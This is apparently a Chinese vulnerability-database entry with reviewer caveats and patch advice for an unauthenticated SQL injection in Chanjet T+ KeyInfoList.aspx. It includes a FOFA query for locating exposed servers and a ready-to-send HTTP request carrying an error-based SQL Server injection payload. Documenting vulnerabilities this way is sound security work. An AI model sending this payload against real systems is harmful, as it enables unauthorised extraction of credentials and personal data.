---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "畅捷通T+ KeyInfoList zt SQL 注入"
product: "畅捷通T+"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "13.0<version<16.0声明，边界待核；SQL Server"
prerequisites: "无Cookie样例"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%95%85%E6%8D%B7%E9%80%9A/%E7%95%85%E6%8D%B7%E9%80%9AT%2B%20KeyInfoList.aspx%20SQL%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"畅捷通-TPlus\""
id: "vw-abfd700441a16443754ebbe8"
entity_id: "ve-abfd700441a16443754ebbe8"
schema_version: "1"
---

# 畅捷通T+ KeyInfoList zt SQL 注入

## 条目说明

- 对象与具体问题：畅捷通T+；KeyInfoList zt SQLi
- 版本、配置及部署条件：13.0<version<16.0声明，边界待核；SQL Server
- 认证与权限前提：无Cookie样例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与keyEdit不同端点/参数应独立
- MD5转换请求无结果文本或截图，未支撑成功/在野
- 补丁链接仅产品列表，范围是否排除13/16需原厂证据；请求未围栏

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

由于畅捷通T+的KeyInfoList.aspx接口处未对用户的输入进行过滤和校验，未经身份验证的攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 影响范围

13.0< version < 16.0

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="畅捷通-TPlus"

POC/EXP：

```http
GET /tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=')AND+1+IN+(SELECT+sys.fn_varbintohexstr(hashbytes('MD5','hahahah')))--+ HTTP/1.1
Host: 127.0.0.1:9090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```


## 修复方案

**官方修复：**

关闭互联网暴露面或接口设置访问权限

目前官方已发布补丁更新，建议受影响用户尽快安装。

https://www.chanjetvip.com/product/goods


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
